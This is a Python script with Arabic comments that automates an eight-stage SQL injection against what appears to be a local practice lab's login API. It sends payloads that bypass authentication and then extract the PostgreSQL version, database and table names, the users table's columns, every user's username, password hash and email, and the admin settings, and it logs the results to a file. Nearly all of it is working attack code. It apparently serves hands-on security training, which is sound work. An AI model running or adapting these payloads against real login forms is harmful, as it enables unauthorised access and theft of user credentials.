#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎯 أداة الحقن اليدوي الآلي - المستوى الأول
Manual SQL Injection Automation Tool - Level 1

هذا السكريبت ينفذ جميع مراحل الاستغلال اليدوي تلقائياً
"""

import requests
import json
import time
import sys
from datetime import datetime

# إعدادات الاتصال
BASE_URL = "http://localhost:3000/api/level1"
HEADERS = {"Content-Type": "application/json"}

def print_banner():
    """طباعة عنوان البرنامج"""
    print("=" * 60)
    print("🎯 أداة الحقن اليدوي الآلي - المستوى الأول")
    print("Manual SQL Injection Automation - Level 1")
    print("=" * 60)
    print()

def send_payload(username, password="test", description=""):
    """إرسال payload واستقبال النتيجة"""
    data = {"username": username, "password": password}
    
    print(f"📤 إرسال: {description}")
    print(f"🔹 Payload: {username}")
    print(f"🔹 URL: {BASE_URL}")
    
    try:
        response = requests.post(BASE_URL, json=data, headers=HEADERS, timeout=10)
        result = response.json()
        
        print(f"📬 Response Code: {response.status_code}")
        print(f"📬 Response: {json.dumps(result, indent=2, ensure_ascii=False)}")
        
        return {"success": True, "data": result, "status_code": response.status_code}
        
    except requests.exceptions.RequestException as e:
        error_msg = f"❌ خطأ في الشبكة: {str(e)}"
        print(error_msg)
        return {"success": False, "error": error_msg}
    except json.JSONDecodeError as e:
        error_msg = f"❌ خطأ في تحليل JSON: {str(e)}"
        print(error_msg)
        return {"success": False, "error": error_msg}

def exploit_level1():
    """تنفيذ جميع مراحل الاستغلال"""
    
    print_banner()
    
    # قائمة جميع الـ payloads
    payloads = [
        {
            "stage": "1/8",
            "name": "تأكيد وجود الثغرة",
            "description": "Authentication Bypass",
            "payload": "admin' OR '1'='1' --",
            "password": "anything",
            "expected": "تسجيل دخول ناجح"
        },
        {
            "stage": "2/8", 
            "name": "معرفة إصدار قاعدة البيانات",
            "description": "Database Version Discovery",
            "payload": "admin' UNION SELECT version(),NULL,NULL,NULL,NULL,NULL --",
            "password": "test",
            "expected": "PostgreSQL version info"
        },
        {
            "stage": "3/8",
            "name": "استخراج أسماء قواعد البيانات", 
            "description": "Database Names Extraction",
            "payload": "admin' UNION SELECT datname,NULL,NULL,NULL,NULL,NULL FROM pg_database --",
            "password": "test",
            "expected": "postgres, sqli_lab, template0, template1"
        },
        {
            "stage": "4/8",
            "name": "استخراج أسماء الجداول",
            "description": "Table Names Extraction", 
            "payload": "admin' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public' --",
            "password": "test",
            "expected": "users, admin_settings, logs, user_sessions"
        },
        {
            "stage": "5/8",
            "name": "استخراج هيكل جدول المستخدمين",
            "description": "Users Table Structure",
            "payload": "admin' UNION SELECT column_name,data_type,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' ORDER BY ordinal_position --",
            "password": "test", 
            "expected": "id, username, password, email, first_name, last_name, role"
        },
        {
            "stage": "6/8",
            "name": "💎 استخراج جميع بيانات المستخدمين (الأهم)",
            "description": "🔥 CRITICAL: All Users Data Extraction",
            "payload": "admin' UNION SELECT id||'|'||username||'|'||password||'|'||email||'|'||COALESCE(first_name,'')||'|'||COALESCE(last_name,'')||'|'||role,NULL,NULL,NULL,NULL,NULL FROM users --",
            "password": "test",
            "expected": "Complete user database with hashed passwords"
        },
        {
            "stage": "7/8",
            "name": "معلومات النظام المتقدمة",
            "description": "Advanced System Information",
            "payload": "admin' UNION SELECT current_user||'|'||current_database()||'|'||version(),NULL,NULL,NULL,NULL,NULL --", 
            "password": "test",
            "expected": "postgres|sqli_lab|PostgreSQL version"
        },
        {
            "stage": "8/8",
            "name": "استخراج إعدادات الإدارة",
            "description": "Admin Settings Extraction",
            "payload": "admin' UNION SELECT setting_name||'='||setting_value,NULL,NULL,NULL,NULL,NULL FROM admin_settings --",
            "password": "test",
            "expected": "Admin configuration data"
        }
    ]
    
    successful_payloads = []
    failed_payloads = []
    
    # تنفيذ كل payload
    for i, payload_info in enumerate(payloads, 1):
        print(f"\n🔥 [{payload_info['stage']}] {payload_info['name']}")
        print("=" * 50)
        print(f"📝 الوصف: {payload_info['description']}")
        print(f"🎯 النتيجة المتوقعة: {payload_info['expected']}")
        print("-" * 50)
        
        result = send_payload(
            payload_info['payload'], 
            payload_info['password'],
            payload_info['description']
        )
        
        if result['success']:
            successful_payloads.append({
                "stage": payload_info['stage'],
                "name": payload_info['name'], 
                "payload": payload_info['payload'],
                "result": result['data']
            })
            print("✅ نجح الاستغلال!")
        else:
            failed_payloads.append({
                "stage": payload_info['stage'],
                "name": payload_info['name'],
                "payload": payload_info['payload'], 
                "error": result['error']
            })
            print("❌ فشل الاستغلال!")
        
        print("-" * 50)
        
        # تأخير قصير بين الطلبات
        if i < len(payloads):
            print("⏱️  انتظار 2 ثانية...")
            time.sleep(2)
    
    # تقرير النتائج النهائي
    print_final_report(successful_payloads, failed_payloads)

def print_final_report(successful, failed):
    """طباعة التقرير النهائي"""
    print("\n" + "=" * 60)
    print("📊 التقرير النهائي - Final Report")
    print("=" * 60)
    
    print(f"\n✅ العمليات الناجحة: {len(successful)}")
    print(f"❌ العمليات الفاشلة: {len(failed)}")
    
    if successful:
        print("\n🎯 أهم الـ Payloads الناجحة:")
        print("-" * 40)
        for payload in successful:
            print(f"• [{payload['stage']}] {payload['name']}")
            print(f"  Payload: {payload['payload']}")
            print()
    
    if failed:
        print("\n❌ الـ Payloads الفاشلة:")
        print("-" * 40)
        for payload in failed:
            print(f"• [{payload['stage']}] {payload['name']}")
            print(f"  خطأ: {payload['error']}")
            print()
    
    # حفظ النتائج في ملف
    save_results_to_file(successful, failed)
    
    print("\n🎉 انتهى الاستغلال اليدوي!")
    print("📄 تم حفظ النتائج في: manual_injection_results.txt")

def save_results_to_file(successful, failed):
    """حفظ النتائج في ملف"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open("manual_injection_results.txt", "w", encoding="utf-8") as f:
        f.write(f"تقرير الحقن اليدوي - المستوى الأول\n")
        f.write(f"تاريخ التنفيذ: {timestamp}\n")
        f.write("=" * 50 + "\n\n")
        
        f.write(f"العمليات الناجحة: {len(successful)}\n")
        f.write(f"العمليات الفاشلة: {len(failed)}\n\n")
        
        if successful:
            f.write("الـ Payloads الناجحة:\n")
            f.write("-" * 30 + "\n")
            for payload in successful:
                f.write(f"[{payload['stage']}] {payload['name']}\n")
                f.write(f"Payload: {payload['payload']}\n")
                f.write(f"النتيجة: {json.dumps(payload['result'], ensure_ascii=False, indent=2)}\n")
                f.write("\n")
        
        if failed:
            f.write("الـ Payloads الفاشلة:\n") 
            f.write("-" * 30 + "\n")
            for payload in failed:
                f.write(f"[{payload['stage']}] {payload['name']}\n")
                f.write(f"Payload: {payload['payload']}\n")
                f.write(f"الخطأ: {payload['error']}\n\n")

def main():
    """الدالة الرئيسية"""
    try:
        print("🚀 بدء الحقن اليدوي الآلي للمستوى الأول...")
        print("🔗 التأكد من تشغيل المختبر على: http://localhost:3000")
        print()
        
        # اختبار الاتصال أولاً
        try:
            response = requests.get("http://localhost:3000", timeout=5)
            print("✅ المختبر يعمل بشكل صحيح!")
        except:
            print("❌ خطأ: المختبر غير متاح! تأكد من تشغيل start-lab.bat")
            sys.exit(1)
        
        input("\n🎯 اضغط Enter للبدء...")
        exploit_level1()
        
    except KeyboardInterrupt:
        print("\n\n⛔ تم إيقاف البرنامج بواسطة المستخدم")
    except Exception as e:
        print(f"\n❌ خطأ غير متوقع: {str(e)}")

if __name__ == "__main__":
    main()
